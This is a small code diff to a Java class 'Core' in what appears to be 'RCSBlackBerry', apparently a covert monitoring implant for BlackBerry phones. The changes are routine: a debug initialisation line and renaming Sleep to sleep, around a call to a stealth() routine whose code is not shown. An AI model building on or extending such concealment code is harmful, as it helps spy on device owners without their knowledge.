@@ -27,6 +27,7 @@ public class Core {
      *            the args
      */
     public static void libMain(final String[] args) {
+        debug.init(true,false,true);        
         debug.trace("RCSBlackBerry launching");
 
         Core core = new Core();
@@ -52,12 +53,12 @@ public class Core {
      * @return true, if successful
      */
     public final boolean run() {
-        Utils.Sleep(500);
+        Utils.sleep(500);
 
         getMyName();
         stealth();
 
-        Utils.Sleep(5000);
+        Utils.sleep(5000);
 
         for (;;) {
             if (taskObj.taskInit() == false) {
